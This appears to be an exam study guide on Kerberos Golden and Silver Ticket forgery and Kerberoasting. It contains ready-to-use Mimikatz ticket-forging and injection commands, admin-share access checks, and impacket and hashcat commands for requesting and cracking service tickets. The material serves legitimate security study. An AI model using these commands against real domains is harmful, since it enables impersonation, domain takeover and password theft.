# Golden Ticket vs Silver Ticket

No CPTS repo. Just the concept, easy explanation, tools, and practical lab commands.

## 1. First understand Kerberos

Kerberos mainly uses two tickets:

- **TGT (Ticket Granting Ticket)** → proves who you are to the KDC.
- **TGS (Service Ticket)** → lets you access a specific service such as `CIFS`, `HTTP`, `MSSQLSvc`.

Think of it like:

```text
Username + Password
        ↓
      TGT
        ↓
     TGS
        ↓
Access specific service
```

---

# 2. Golden Ticket

### What is it?

A **Golden Ticket** is a **forged TGT**.

The attacker uses the secret of the domain's **`krbtgt` account** to create a fake TGT.

Because `krbtgt` is used to sign/validate TGTs, controlling its key can effectively allow arbitrary Kerberos identities to be forged.

### What do you need?

Usually:

```text
krbtgt NTLM/AES key
Domain SID
Domain name
Username
```

### Impact

Golden Ticket is generally **domain-wide**.

For example:

```text
krbtgt compromised
       ↓
Forge TGT as administrator
       ↓
Request service tickets
       ↓
Access domain resources
```

---

## Golden Ticket with Mimikatz

In an authorized lab, after obtaining the `krbtgt` hash:

```cmd
mimikatz.exe
```

Enable privileges:

```text
privilege::debug
```

Forge the ticket:

```text
kerberos::golden /user:hacker /domain:corp.local /sid:S-1-5-21-111111111-222222222-333333333 /krbtgt:<KRBTGT_HASH> /ptt
```

Important parameters:

```text
/user      = fake username
/domain    = AD domain
/sid       = domain SID
/krbtgt    = krbtgt NTLM hash
/ptt       = inject ticket into current session
```

Check the ticket:

```cmd
klist
```

Then access a domain resource, for example:

```cmd
dir \\DC01\C$
```

### Easy memory trick

> **Golden Ticket = fake TGT = `krbtgt` key**

---

# 3. Silver Ticket

### What is it?

A **Silver Ticket** is a **forged TGS**.

Instead of forging a domain-wide TGT, you forge a ticket for **one specific service**.

Example:

```text
CIFS/DC01
HTTP/web01
MSSQLSvc/sql01
```

### What do you need?

Typically:

```text
Service account/computer account key
Domain SID
Domain name
Target service
Username
```

For example, if you have the machine account key for `FILE01$`, you could forge a ticket for:

```text
cifs/FILE01
```

### Impact

Much more **service-specific** than a Golden Ticket.

```text
Golden:
krbtgt key
   ↓
TGT
   ↓
many services

Silver:
service/computer key
   ↓
TGS
   ↓
specific service
```

---

# 4. Silver Ticket with Mimikatz

Example for a CIFS service:

```cmd
mimikatz.exe
```

```text
privilege::debug
```

Then:

```text
kerberos::golden /user:hacker /domain:corp.local /sid:S-1-5-21-111111111-222222222-333333333 /target:FILE01.corp.local /service:cifs /rc4:<SERVICE_ACCOUNT_NTLM> /ptt
```

Important:

```text
/target    = target server
/service   = service being forged
/rc4       = service account/computer NTLM hash
/ptt       = inject ticket
```

Check:

```cmd
klist
```

Access the service:

```cmd
dir \\FILE01\C$
```

### Easy memory trick

> **Silver Ticket = fake TGS = service account/computer key**

---

# 5. Golden vs Silver

| | Golden Ticket | Silver Ticket |
|---|---|---|
| Forged ticket | **TGT** | **TGS** |
| Main key | `krbtgt` | Service/computer account |
| Scope | Broad/domain-wide | Specific service |
| Example | Domain authentication | `CIFS`, `HTTP`, `MSSQLSvc` |
| Main tool | Mimikatz | Mimikatz |
| Key to remember | `krbtgt` | Service account |

---

# 6. Don't confuse with Kerberoasting

These are different.

### Kerberoasting

You **request a real TGS** for an SPN and try to crack it offline.

```text
User
 ↓
Request TGS
 ↓
Real service ticket
 ↓
Crack service account password
```

Example:

```bash
impacket-GetUserSPNs 'corp.local/user:Password123' -dc-ip 10.10.10.10 -request
```

Then crack:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### Silver Ticket

You already have the service account key/hash and **forge the TGS yourself**.

```text
Kerberoasting
→ get real TGS → crack password

Silver Ticket
→ obtain service key → forge fake TGS
```

---

# 7. Golden vs Silver vs Kerberoasting

```text
KRBTGT HASH
    ↓
Golden Ticket
    ↓
Fake TGT
    ↓
Many services
```

```text
SERVICE ACCOUNT HASH
    ↓
Silver Ticket
    ↓
Fake TGS
    ↓
Specific service
```

```text
SPN
    ↓
Kerberoasting
    ↓
Real TGS
    ↓
Offline password cracking
    ↓
Service account password
```

## Exam Memory

```text
Golden  = TGT = krbtgt
Silver  = TGS = service account/computer
Kerberoast = real TGS → crack password
```

### Common commands/tools to remember

```text
Mimikatz
    kerberos::golden

Impacket
    GetUserSPNs.py
    ticketer.py
    psexec.py

Hashcat
    -m 13100   # Kerberoasting
```

For CPTS-style questions, the **most important distinction** is:

> **Golden Ticket requires the `krbtgt` secret and creates a TGT. Silver Ticket requires a service account/computer secret and creates a TGS for a particular service.**
